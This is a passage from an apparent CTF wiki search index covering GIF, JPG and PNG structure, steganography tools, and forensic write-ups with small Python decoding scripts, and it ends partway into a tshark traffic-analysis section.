11 10 12 20 13 20 14 10 15 10 Here we inferred that 20 & 10 represent 0 & 1, each frame interval is extracted and transformed into 1s and 0s. cat flag | cut -d ' ' -f 2 | tr -d '66' | tr -d '\\n' | tr -d '0' | tr '2' '0' 0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101 # Finally, convert the binary to ASCII to get the flag. Tools \u00b6 F5-steganography","title":"GIF"},{"location":"misc/picture/gif/#file-structure","text":"The file structure of a GIF file: File Header File Signature Version Number Data Stream Control Identifier Image Block Other Extension Blocks File Trailer A diagram for the structure of a GIF file:","title":"File Structure"},{"location":"misc/picture/gif/#file-header","text":"Signature and Version Number. The signature, which consists of three bytes GIF , is used to confirm whether a file is in GIF format. The file version number is also composed of three bytes, 87a or 89a .","title":"File header"},{"location":"misc/picture/gif/#logical-screen-descriptor","text":"The Logical Screen Descriptor is always located right after the header. This tells the decoder how big the image will be. It is exactly 7 bytes long. It starts with the canvas width and canvas height.","title":"Logical Screen Descriptor"},{"location":"misc/picture/gif/#global-color-table","text":"The GIF format can have a global color table or local color tables for each sub-image. Each color table contains a list of RGB (Red, Green, Blue) color component intensities, for example, (255\uff0c0\uff0c0) represents red.","title":"Global Color Table"},{"location":"misc/picture/gif/#image-descriptor","text":"A single GIF file may contain multiple images. In the original GIF rendering model, these were meant to be composited onto a larger virtual canvas. Nowadays multiple images are normally used for animations. Each image begins with an image descriptor block, which is exactly 10 bytes long.","title":"Image Descriptor"},{"location":"misc/picture/gif/#image-data","text":"Finally, we get to the actual image data. The image data is composed of a series of output codes that tell the decoder which colors to emit to the canvas. These codes are combined into the bytes that make up the block.","title":"Image Data"},{"location":"misc/picture/gif/#file-trailer","text":"The trailer block indicates when you've reached the end of the file. It is always a byte 3B . For more details, see what is in a GIF","title":"File Trailer"},{"location":"misc/picture/gif/#ctf-examples","text":"","title":"CTF Examples"},{"location":"misc/picture/gif/#wdctf-20173-2","text":"The animation in GIFs is made up of a sequence of frames, each frame can be an image that contains hidden information. You can use the convert command to separate each frame in the GIF file. Run this command to split each frame of the GIF file: ffmpeg -i cake.gif cake-%d.png After opening and separating each frame of the GIF image, it's clear that each frame was a part of a QR code, so let's combine the frames into a complete QR code using Python . from PIL import Image flag = Image . new ( \"RGB\" ,( 450 , 450 )) for i in range ( 2 ): for j in range ( 2 ): pot = \"cake- {} .png\" . format ( j + i * 2 + 1 ) potImage = Image . open ( pot ) crop = potImage . crop ((( j * 225 , i * 225 , ( j + 1 ) * 225 , ( i + 1 ) * 225 ))) flag . paste ( crop , ( j * 225 , i * 225 )) flag . save ( './flag.png' ) After scanning the QR code, you get a string of hexadecimal strings. 03f30d0ab8c1aa5 .... 74080006030908 The beginning 03f3 is the header of a pyc file, restore it to python executable, and run it to get the flag. Here is the decompiled code using uncompyle6: # uncompyle6 version 3.7.4 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)] # Embedded file name: /home/ctf/bbb.py # Compiled at: 2017-09-02 09:35:36 import random key = 'ctf' strr = '186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43' def func1 ( str1 , key ): random . seed ( key ) str2 = '' for c in str1 : str2 += str ( ord ( c ) ^ random . randint ( 0 , 255 )) + ',' str2 = str2 . strip ( ',' ) return str2 def func2 ( str2 , key ): random . seed ( key ) str1 = '' for i in str2 . split ( ',' ): i = int ( i ) n = random . randint ( 0 , 255 ) str1 += chr ( i ^ n ) print ( n ) return str1 print ( func2 ( strr , key )) Note Run the script using Python2 python2.7 bbb.py flag { U_r_Greatt! }","title":"WDCTF-2017:3-2"},{"location":"misc/picture/gif/#xman-2017100gif","text":"Download the challenge here The time interval between each frame of a GIF file can also be used to hide information. By using the identify command, we printed the time interval of each frame. $ identify -format \"%s %T \\n\" 100 .gif 0 66 1 66 2 20 3 10 4 20 5 10 6 10 7 20 8 20 9 20 10 20 11 10 12 20 13 20 14 10 15 10 Here we inferred that 20 & 10 represent 0 & 1, each frame interval is extracted and transformed into 1s and 0s. cat flag | cut -d ' ' -f 2 | tr -d '66' | tr -d '\\n' | tr -d '0' | tr '2' '0' 0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101 # Finally, convert the binary to ASCII to get the flag.","title":"XMAN-2017:100.gif"},{"location":"misc/picture/gif/#tools","text":"F5-steganography","title":"Tools"},{"location":"misc/picture/introduction/","text":"Image files are a good way to incorporate hacker culture, so a variety of images are used in CTFs. Image files come in a variety of complex formats. Some methods used to solve CTF challenges involve finding metadata and hidden information, decoding lossless compression, checking validation, performing steganography, or extracting printable characters. All of those are important topics of Misc, involving understanding basic file formats, common steganography techniques, and steganography software. Metadata \u00b6 Metadata is \"data that provides information about other data\". In other words, it is \"data about data\". Many distinct types of metadata exist, including descriptive metadata, structural metadata, administrative metadata, reference metadata, statistical metadata, and legal metadata. Hiding information in metadata is one of the most basic techniques CTFs, usually used to hide some key information like a hint or password . You can view the metadata of an image by right-clicking on Properties or by using the strings command. In general, some hidden information (strange-looking strings) often appears at the beginning or end of the file. Next, we introduce an identify command, which is used to get the format and characteristics of one or more image files. -format is used to specify the information displayed, and the -format option can make a problem easier to solve. For more details, see Format Option Usage CTF Example \u00b6 Break In 2017 - Mysterious GIF \u00b6 Download the challenge file here One of the difficulties in this problem is to find and extract the metadata in GIF. First, use the strings command to see the text strings and find abnormal text. GIF89a !!!\"\"\"###$$$%%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~ 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 NETSCAPE2.0 ImageMagick ... Here, the strings of hexadecimal are hidden in the GIF metadata. The next step is extraction, you can use Python, but it is more convenient to use identify root@linux:~/Desktop/tmp# identify -format \"%s %c \\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 ... 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d Other steps are not described here, please refer to the writeup . Pixel Values Conversion \u00b6 Look at the data in this file, does it reminds you of anything? 255,255,255,255,255........... It's a string of RGB values. Let's try to turn it into an image. from PIL import Image import re x = 307 #x coordinate y = 311 #y coordinate # x*y = row number rgb1 = [ **** ] print len ( rgb1 ) / 3 m = 0 for i in xrange ( 0 , x ): for j in xrange ( 0 , y ): line = rgb1 [( 3 * m ):( 3 * ( m + 1 ))] # get line m += 1 rgb = line im . putpixel (( i , j ),( int ( rgb [ 0 ]), int ( rgb [ 1 ]), int ( rgb [ 2 ]))) #rgb values converted to pixels im . show () im . save ( \"flag.png\" ) On the other hand, the RGB value is extracted from an image, and then the RGB values are converted to get the final Flag. Most of these questions are pictures composed of pixel blocks, as shown in the figure below: Related CTF Challenges \u00b6 CSAW-2016-quals:brainfun breakin-ctf-2017:A-dance-partner","title":"Introduction to Image Analysis"},{"location":"misc/picture/introduction/#metadata","text":"Metadata is \"data that provides information about other data\". In other words, it is \"data about data\". Many distinct types of metadata exist, including descriptive metadata, structural metadata, administrative metadata, reference metadata, statistical metadata, and legal metadata. Hiding information in metadata is one of the most basic techniques CTFs, usually used to hide some key information like a hint or password . You can view the metadata of an image by right-clicking on Properties or by using the strings command. In general, some hidden information (strange-looking strings) often appears at the beginning or end of the file. Next, we introduce an identify command, which is used to get the format and characteristics of one or more image files. -format is used to specify the information displayed, and the -format option can make a problem easier to solve. For more details, see Format Option Usage","title":"Metadata"},{"location":"misc/picture/introduction/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/picture/introduction/#break-in-2017-mysterious-gif","text":"Download the challenge file here One of the difficulties in this problem is to find and extract the metadata in GIF. First, use the strings command to see the text strings and find abnormal text. GIF89a !!!\"\"\"###$$$%%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~ 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 NETSCAPE2.0 ImageMagick ... Here, the strings of hexadecimal are hidden in the GIF metadata. The next step is extraction, you can use Python, but it is more convenient to use identify root@linux:~/Desktop/tmp# identify -format \"%s %c \\n\" Question.gif 0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172 1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271 ... 24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f 25 724b3052485a6b745062457335797444737142486435504646773d3d Other steps are not described here, please refer to the writeup .","title":"Break In 2017 - Mysterious GIF"},{"location":"misc/picture/introduction/#pixel-values-conversion","text":"Look at the data in this file, does it reminds you of anything? 255,255,255,255,255........... It's a string of RGB values. Let's try to turn it into an image. from PIL import Image import re x = 307 #x coordinate y = 311 #y coordinate # x*y = row number rgb1 = [ **** ] print len ( rgb1 ) / 3 m = 0 for i in xrange ( 0 , x ): for j in xrange ( 0 , y ): line = rgb1 [( 3 * m ):( 3 * ( m + 1 ))] # get line m += 1 rgb = line im . putpixel (( i , j ),( int ( rgb [ 0 ]), int ( rgb [ 1 ]), int ( rgb [ 2 ]))) #rgb values converted to pixels im . show () im . save ( \"flag.png\" ) On the other hand, the RGB value is extracted from an image, and then the RGB values are converted to get the final Flag. Most of these questions are pictures composed of pixel blocks, as shown in the figure below:","title":"Pixel Values Conversion"},{"location":"misc/picture/introduction/#related-ctf-challenges","text":"CSAW-2016-quals:brainfun breakin-ctf-2017:A-dance-partner","title":"Related CTF Challenges"},{"location":"misc/picture/jpg/","text":"File Structure \u00b6 JPEG has a lossy compression format, the pixel information is saved into a file and then read out, some of the pixel values will have a little change. There is a quality parameter that can be set between 0 and 100 when saving. The larger the parameter, the more fidelity the picture has. In general, 70 or 80 is sufficient JPEG has no transparency information There are two basic types of JPG data structures: \"segments\" and compressed encoded image data. Name Number of Bytes Byte Data Description Segment Identification 1 FF Start ID of each new segment Segment Type 1 Type Encoding (called Marker) Segment Length 2 Length of content and segment, excluding segment ID and type Segment Content 2 \u226465533 bytes Some segment contains no length or content, but just the segment marking and type. File head and end are examples of this. Any amount of FF between segments is valid; these FF 's are called \"padding bytes\" and must be ignored. Some common segment types: Note that a JPG file starts with 0xffd8 and ends with 0xffd9 . Tools \u00b6 Stegdetect \u00b6 Stegdetect is a tool to detect steganography in image files, it supports different methods, which are used to hide content. Currently, the detectable schemes are: jsteg, jphide, invisible secrets, outguess, F5 (header analysis), appendX and camouflage. Additionally, it can also brute force passwords and extract information from Jphide, outguess, and jsteg-shell. -q Only reports images that are likely to have steganographic content. -n -n Enables checking of JPEG header information to surpress false positives. If enabled, all JPEG images that contain comment fields will be treated as negatives. OutGuess checking will be disabled if the JFIF marker does not match version 1.1. -s Changes the sensitivity of the detection algorithms. Their results are multiplied by the specified number. The higher the number the more sensitive the test will become. The default is 1. -d Prints debug information. -t Sets the tests that are being run on the image. The following characters are understood: j Tests if information has been embedded with jsteg. o Tests if information has been embedded with outguess. p Tests if information has been embedded with jphide. i Tests if information has been hidden with invisible secrets. JPHS \u00b6 JPHS is a steganography tool. It is developed by Allan Latham that encrypt, hide, and detect information of lossy compressed JPEG files. The tool contains two programs: JPHIDE and JPSEEK. Jphide program can hide information in a JPEG image. The JPSEEK program can detect and extract information hidden using the JPHIDE program. The JPHSWIN program is a Windows version of JPHS that has a graphical interface that contains JPHIDE and JPSEEK functions. SilentEye \u00b6 SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"JPG"},{"location":"misc/picture/jpg/#file-structure","text":"JPEG has a lossy compression format, the pixel information is saved into a file and then read out, some of the pixel values will have a little change. There is a quality parameter that can be set between 0 and 100 when saving. The larger the parameter, the more fidelity the picture has. In general, 70 or 80 is sufficient JPEG has no transparency information There are two basic types of JPG data structures: \"segments\" and compressed encoded image data. Name Number of Bytes Byte Data Description Segment Identification 1 FF Start ID of each new segment Segment Type 1 Type Encoding (called Marker) Segment Length 2 Length of content and segment, excluding segment ID and type Segment Content 2 \u226465533 bytes Some segment contains no length or content, but just the segment marking and type. File head and end are examples of this. Any amount of FF between segments is valid; these FF 's are called \"padding bytes\" and must be ignored. Some common segment types: Note that a JPG file starts with 0xffd8 and ends with 0xffd9 .","title":"File Structure"},{"location":"misc/picture/jpg/#tools","text":"","title":"Tools"},{"location":"misc/picture/jpg/#stegdetect","text":"Stegdetect is a tool to detect steganography in image files, it supports different methods, which are used to hide content. Currently, the detectable schemes are: jsteg, jphide, invisible secrets, outguess, F5 (header analysis), appendX and camouflage. Additionally, it can also brute force passwords and extract information from Jphide, outguess, and jsteg-shell. -q Only reports images that are likely to have steganographic content. -n -n Enables checking of JPEG header information to surpress false positives. If enabled, all JPEG images that contain comment fields will be treated as negatives. OutGuess checking will be disabled if the JFIF marker does not match version 1.1. -s Changes the sensitivity of the detection algorithms. Their results are multiplied by the specified number. The higher the number the more sensitive the test will become. The default is 1. -d Prints debug information. -t Sets the tests that are being run on the image. The following characters are understood: j Tests if information has been embedded with jsteg. o Tests if information has been embedded with outguess. p Tests if information has been embedded with jphide. i Tests if information has been hidden with invisible secrets.","title":"Stegdetect"},{"location":"misc/picture/jpg/#jphs","text":"JPHS is a steganography tool. It is developed by Allan Latham that encrypt, hide, and detect information of lossy compressed JPEG files. The tool contains two programs: JPHIDE and JPSEEK. Jphide program can hide information in a JPEG image. The JPSEEK program can detect and extract information hidden using the JPHIDE program. The JPHSWIN program is a Windows version of JPHS that has a graphical interface that contains JPHIDE and JPSEEK functions.","title":"JPHS"},{"location":"misc/picture/jpg/#silenteye","text":"SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"SilentEye"},{"location":"misc/picture/png/","text":"PNG \u00b6 File Structure \u00b6 For a PNG file, the header is always represented by fixed bytes, and the remaining parts consist of three or more chunks of PNG data in a specific order. File header: 89 50 4E 47 0D 0A 1A 0A + chunk + chunk + chunk... Chunks \u00b6 PNG contains two types of chunks: one called critical chunks that are the standard chunks, another called ancillary chunks that are optional. Critical chunks define four standard chucks that must be included in every PNG file, and a PNG reader must support these blocks. Chunk Characters Chunk Name Multiple Chucks Optional Position Limitation IHDR Image Header False False First Chunk cHRM Primary Chromaticities and White Point False True Before PLTE and IDAT gAMA Image Gamma False True Before PLTE and IDAT sBIT Significant Bits False True Before PLTE and IDAT PLTE Palette False True Before IDAT bKGD Background Color False True Before PLTE and IDAT hIST Image Histogram False True Before PLTE and IDAT tRNS Transparency False True Before PLTE and IDAT oFFs Image Offset False True Before IDAT pHYs Physical Pixel Dimensions False True Before IDAT sCAL Physical Scale False True Before IDAT IDAT Image Data True False Consecutive with Other IDATs tIME Image Last Modification Time False True No limit tEXt Textual Data True True No limit zTXt Compressed Textual Data True True No limit fRAc Fractal Parameters True True No limit gIFg GIF Conversion Info True True No limit gIFt GIF Plain Text True True No limit gIFx GIF Conversion Info True True No limit IEND Image Trailer False False End of PNG Data Stream There is a unified structure for each chunk, and each chunk is composed of four parts: Name Length in Bytes Description Length 4 Bytes Specifies the length of the data field in the chunk, which does not exceed (231-1) bytes Chunk Type Code 4 Bytes Consists of ASCII letters (A-Z and A-Z) Chunk Data length Varies Stores the data specified by the Chunk Type Code CRC 4 Bytes Stores the Cyclic Redundancy Check information CRC\uff08Cyclic Redundancy Check\uff09value is calculated based on the Chunk Type Code and Chunk Data. For more details, see PNG Chunks IHDR \u00b6 IHDR (Image Header Chunk): It stores basic image information, 13-bytes long, must be the first chunk in a PNG data stream, and there must be only one file header chunk in a PNG data stream. Name Number of Bytes Description Width 4 bytes Image width (in pixels) Height 4 bytes Image height (in pixels) We often change the height or width of an image to corrupt it to hide information. You can see here Kali won\u2019t open the image, showing the IHDR CRC error . This is a sign that the IHDR chunk was modified. You might be able to restore the corrupted image by changing the image\u2019s width and length, or file header back to the correct values. CTF Example \u00b6 WDCTF-finals-2017 \u00b6 Download the challenge here If you look at the file, you can see that the header and width of the PNG file are incorrect. 00000000 80 59 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.YNG........IHDR| 00000010 00 00 00 00 00 00 02 f8 08 06 00 00 00 93 2f 8a |............../.| 00000020 6b 00 00 00 04 67 41 4d 41 00 00 9c 40 20 0d e4 |k....gAMA...@ ..| 00000030 cb 00 00 00 20 63 48 52 4d 00 00 87 0f 00 00 8c |.... cHRM.......| 00000040 0f 00 00 fd 52 00 00 81 40 00 00 7d 79 00 00 e9 |....R...@..}y...| ... Note that you can't just randomly change the image's width, you need to brute force the width based on the IHDR chunk's CRC value (see Python script below). import os import binascii import struct misc = open ( \"misc4.png\" , \"rb\" ) . read () for i in range ( 1024 ): data = misc [ 12 : 16 ] + struct . pack ( '>i' , i ) + misc [ 20 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0x932f8a6b : print ( i ) The script returned 709 , so changing the image's width to 709 will restore the image and get you the flag. PLTE \u00b6 PLTE (Palette Chunk): It contains from 1 to 256 palette entries, each a three-byte series of the form. - Red: 1 byte (0 = black, 255 = red) - Green: 1 byte (0 = black, 255 = green) - Blue: 1 byte (0 = black, 255 = blue) IDAT \u00b6 IDAT (Image Data Chunk): It stores the actual image data which contains multiple image chucks in the data stream. - Stores image data - Contains multiple image chucks in the data stream - Uses a derivative of LZ77 algorithm to perform compression - Uses zlib to perform decompression Note that IDAT will only continue to a new chunk when the previous chunk is full. CTF Example \u00b6 sctf 2014 - misc \u00b6 Use pngcheck display information about the PNG file Download the challenge here .\\pngcheck.exe -v sctf.png File: sctf.png (1421461 bytes) chunk IHDR at offset 0x0000c, length 13 1000 x 562 image, 32-bit RGB+alpha, non-interlaced chunk sRGB at offset 0x00025, length 1 rendering intent = perceptual chunk gAMA at offset 0x00032, length 4: 0.45455 chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi) chunk IDAT at offset 0x00057, length 65445 zlib: deflated, 32K window, fast compression chunk IDAT at offset 0x10008, length 65524 ... chunk IDAT at offset 0x150008, length 45027 chunk IDAT at offset 0x15aff7, length 138 chunk IEND at offset 0x15b08d, length 0 No errors detected in sctf.png (28 chunks, 36.8% compression). We can see when the first IDAT is full (length 65524 ), it continued to the second IDAT. Now, we know the length for a full IDAT. Try to compare the last two IDAT (offset 0x150008 and 0x15aff7 ), do you see anything strange? The second to last IDAT length is 45027 and the last IDAT length is 138 . Clearly, something is wrong with the last IDAT because the second to last IDAT is not full. Use python and zlib to decompress the content of the last IDAT. Note that length, chunk type, and CRC check value at the end are excluded. import zlib import binascii IDAT = \"789...667\" . decode ( 'hex' ) result = binascii . hexlify ( zlib . decompress ( IDAT )) print result IEND \u00b6 IEND (Image Trailer Chunk): It is used to mark the end of a PNG data stream or file, and it must be placed at the end of the file. Example \u00b6 IEND's chunk length is always 00 00 00 00 IEND's chunk type is always IEND 49 45 4E 44 IEND'S CRC value is always AE 42 60 82 That means a PNG file will always end with these bytes: 00 00 00 00 49 45 4E 44 AE 42 60 82 LSB \u00b6 LSB stands for Least Significant Bit. Each pixel in a PNG image is generally composed of RGB three primary colors (red, green, and blue), each color occupies 8 bits, and the value range is from '0x00' to '0xFF', so there are 256 colors. The total number of colors is equal to 256 to the third power or 16777216. The human eye can distinguish about 10 million different colors, which means the human eye cannot distinguish the remaining 6,777,216 colors. LSB steganography is to modify the Least Significant Bit of each color, containing 8 bits, in an RGB value. If you want to find informing hidden using LSB, you can use this tool Stegsolve to perform analysis. Use the buttons at the bottom of Stegsolve to see information extracted from each color channel. In the following image, we found the hidden information by checking LSB on the red channel: With the help of StegSolve, you can find hidden information by checking LSB each color channel. CTF Example \u00b6 HCTF 2016 - pic again \u00b6 Download the challenge here There is information hidden in the LSB of the RGB colors. Use Stegsolve-->Analyse-->Data Extract to extract it. We can see zip file header, use save bin to save the zip file, and run the ELF executable to obtain the flag.","title":"PNG"},{"location":"misc/picture/png/#png","text":"","title":"PNG"},{"location":"misc/picture/png/#file-structure","text":"For a PNG file, the header is always represented by fixed bytes, and the remaining parts consist of three or more chunks of PNG data in a specific order. File header: 89 50 4E 47 0D 0A 1A 0A + chunk + chunk + chunk...","title":"File Structure"},{"location":"misc/picture/png/#chunks","text":"PNG contains two types of chunks: one called critical chunks that are the standard chunks, another called ancillary chunks that are optional. Critical chunks define four standard chucks that must be included in every PNG file, and a PNG reader must support these blocks. Chunk Characters Chunk Name Multiple Chucks Optional Position Limitation IHDR Image Header False False First Chunk cHRM Primary Chromaticities and White Point False True Before PLTE and IDAT gAMA Image Gamma False True Before PLTE and IDAT sBIT Significant Bits False True Before PLTE and IDAT PLTE Palette False True Before IDAT bKGD Background Color False True Before PLTE and IDAT hIST Image Histogram False True Before PLTE and IDAT tRNS Transparency False True Before PLTE and IDAT oFFs Image Offset False True Before IDAT pHYs Physical Pixel Dimensions False True Before IDAT sCAL Physical Scale False True Before IDAT IDAT Image Data True False Consecutive with Other IDATs tIME Image Last Modification Time False True No limit tEXt Textual Data True True No limit zTXt Compressed Textual Data True True No limit fRAc Fractal Parameters True True No limit gIFg GIF Conversion Info True True No limit gIFt GIF Plain Text True True No limit gIFx GIF Conversion Info True True No limit IEND Image Trailer False False End of PNG Data Stream There is a unified structure for each chunk, and each chunk is composed of four parts: Name Length in Bytes Description Length 4 Bytes Specifies the length of the data field in the chunk, which does not exceed (231-1) bytes Chunk Type Code 4 Bytes Consists of ASCII letters (A-Z and A-Z) Chunk Data length Varies Stores the data specified by the Chunk Type Code CRC 4 Bytes Stores the Cyclic Redundancy Check information CRC\uff08Cyclic Redundancy Check\uff09value is calculated based on the Chunk Type Code and Chunk Data. For more details, see PNG Chunks","title":"Chunks"},{"location":"misc/picture/png/#ihdr","text":"IHDR (Image Header Chunk): It stores basic image information, 13-bytes long, must be the first chunk in a PNG data stream, and there must be only one file header chunk in a PNG data stream. Name Number of Bytes Description Width 4 bytes Image width (in pixels) Height 4 bytes Image height (in pixels) We often change the height or width of an image to corrupt it to hide information. You can see here Kali won\u2019t open the image, showing the IHDR CRC error . This is a sign that the IHDR chunk was modified. You might be able to restore the corrupted image by changing the image\u2019s width and length, or file header back to the correct values.","title":"IHDR"},{"location":"misc/picture/png/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/picture/png/#wdctf-finals-2017","text":"Download the challenge here If you look at the file, you can see that the header and width of the PNG file are incorrect. 00000000 80 59 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.YNG........IHDR| 00000010 00 00 00 00 00 00 02 f8 08 06 00 00 00 93 2f 8a |............../.| 00000020 6b 00 00 00 04 67 41 4d 41 00 00 9c 40 20 0d e4 |k....gAMA...@ ..| 00000030 cb 00 00 00 20 63 48 52 4d 00 00 87 0f 00 00 8c |.... cHRM.......| 00000040 0f 00 00 fd 52 00 00 81 40 00 00 7d 79 00 00 e9 |....R...@..}y...| ... Note that you can't just randomly change the image's width, you need to brute force the width based on the IHDR chunk's CRC value (see Python script below). import os import binascii import struct misc = open ( \"misc4.png\" , \"rb\" ) . read () for i in range ( 1024 ): data = misc [ 12 : 16 ] + struct . pack ( '>i' , i ) + misc [ 20 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0x932f8a6b : print ( i ) The script returned 709 , so changing the image's width to 709 will restore the image and get you the flag.","title":"WDCTF-finals-2017"},{"location":"misc/picture/png/#plte","text":"PLTE (Palette Chunk): It contains from 1 to 256 palette entries, each a three-byte series of the form. - Red: 1 byte (0 = black, 255 = red) - Green: 1 byte (0 = black, 255 = green) - Blue: 1 byte (0 = black, 255 = blue)","title":"PLTE"},{"location":"misc/picture/png/#idat","text":"IDAT (Image Data Chunk): It stores the actual image data which contains multiple image chucks in the data stream. - Stores image data - Contains multiple image chucks in the data stream - Uses a derivative of LZ77 algorithm to perform compression - Uses zlib to perform decompression Note that IDAT will only continue to a new chunk when the previous chunk is full.","title":"IDAT"},{"location":"misc/picture/png/#ctf-example_1","text":"","title":"CTF Example"},{"location":"misc/picture/png/#sctf-2014-misc","text":"Use pngcheck display information about the PNG file Download the challenge here .\\pngcheck.exe -v sctf.png File: sctf.png (1421461 bytes) chunk IHDR at offset 0x0000c, length 13 1000 x 562 image, 32-bit RGB+alpha, non-interlaced chunk sRGB at offset 0x00025, length 1 rendering intent = perceptual chunk gAMA at offset 0x00032, length 4: 0.45455 chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi) chunk IDAT at offset 0x00057, length 65445 zlib: deflated, 32K window, fast compression chunk IDAT at offset 0x10008, length 65524 ... chunk IDAT at offset 0x150008, length 45027 chunk IDAT at offset 0x15aff7, length 138 chunk IEND at offset 0x15b08d, length 0 No errors detected in sctf.png (28 chunks, 36.8% compression). We can see when the first IDAT is full (length 65524 ), it continued to the second IDAT. Now, we know the length for a full IDAT. Try to compare the last two IDAT (offset 0x150008 and 0x15aff7 ), do you see anything strange? The second to last IDAT length is 45027 and the last IDAT length is 138 . Clearly, something is wrong with the last IDAT because the second to last IDAT is not full. Use python and zlib to decompress the content of the last IDAT. Note that length, chunk type, and CRC check value at the end are excluded. import zlib import binascii IDAT = \"789...667\" . decode ( 'hex' ) result = binascii . hexlify ( zlib . decompress ( IDAT )) print result","title":"sctf 2014 - misc"},{"location":"misc/picture/png/#iend","text":"IEND (Image Trailer Chunk): It is used to mark the end of a PNG data stream or file, and it must be placed at the end of the file.","title":"IEND"},{"location":"misc/picture/png/#example","text":"IEND's chunk length is always 00 00 00 00 IEND's chunk type is always IEND 49 45 4E 44 IEND'S CRC value is always AE 42 60 82 That means a PNG file will always end with these bytes: 00 00 00 00 49 45 4E 44 AE 42 60 82","title":"Example"},{"location":"misc/picture/png/#lsb","text":"LSB stands for Least Significant Bit. Each pixel in a PNG image is generally composed of RGB three primary colors (red, green, and blue), each color occupies 8 bits, and the value range is from '0x00' to '0xFF', so there are 256 colors. The total number of colors is equal to 256 to the third power or 16777216. The human eye can distinguish about 10 million different colors, which means the human eye cannot distinguish the remaining 6,777,216 colors. LSB steganography is to modify the Least Significant Bit of each color, containing 8 bits, in an RGB value. If you want to find informing hidden using LSB, you can use this tool Stegsolve to perform analysis. Use the buttons at the bottom of Stegsolve to see information extracted from each color channel. In the following image, we found the hidden information by checking LSB on the red channel: With the help of StegSolve, you can find hidden information by checking LSB each color channel.","title":"LSB"},{"location":"misc/picture/png/#ctf-example_2","text":"","title":"CTF Example"},{"location":"misc/picture/png/#hctf-2016-pic-again","text":"Download the challenge here There is information hidden in the LSB of the RGB colors. Use Stegsolve-->Analyse-->Data Extract to extract it. We can see zip file header, use save bin to save the zip file, and run the ELF executable to obtain the flag.","title":"HCTF 2016 - pic again"},{"location":"misc/traffic/data/","text":"By analyzing the protocols, you can narrow down where data exfiltration occurred. Next, you need to know how to extract the data, which is an important part of network traffic analysis. Wireshark \u00b6 Wireshark automatic extraction: file -> export objects -> http Manual data extraction: file->export selected Packet Bytes tshark \u00b6 As a command-line version of wireshark, tshark is an efficient and fast. It can be used flexibly with other command-line tools ( awk , grep ) to quickly locate and extract data, thus eliminating the need for complicated scripting. Common Methods \u00b6 tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** > data Usage: -Y <display filter> packet displaY filter in Wireshark display filter syntax -T pdml | ps | psml | json | jsonraw | ek | tabs | text | fields | ? format of text output (def: text) -e <field> field to print if -Tfields selected (e.g. tcp.port, _ws.col.Info) Passing the -Y option allows you to apply display filters (same filter as Wireshark), then -T fields -e will let to extract specific fields (such as usb.capdata ). Tips If you are not sure about the field name, you can right-click on the field in Wireshark of a packet, then Apply as Filter \u2192 Selected. You should then see the field name in the filter bar. CTF Example \u00b6 Google CTF 2016 - a cute stegosaurus \u00b6 Download the challenge here The data was hidden very cleverly. There was an image, but it's a rabbit hole and caused a lot of confusion. For this challenge, you need to be familiar with the tcp protocol. There are 6 bits of status code in the TCP message segment: URG: Urgent bit. When URG=1, it means the packet is an urgent packet. It tells the system that there is urgent data in this segment and that it should be sent as soon as possible (equivalent to high-priority data) ACK: Acknowledge bit. When ACK=1, it means the packet is an acknowledgment packet. When ACK=0, the packet is not an acknowledgment packet. The server acknowledges data is received by sending ACK=1 to the sender or client. PSH: Push bit. When PSH=1, it means the other party asks the packets in the buffer to be sent immediately, without waiting for the buffer to be full. RST: Reset bit. When RST=1, it means to 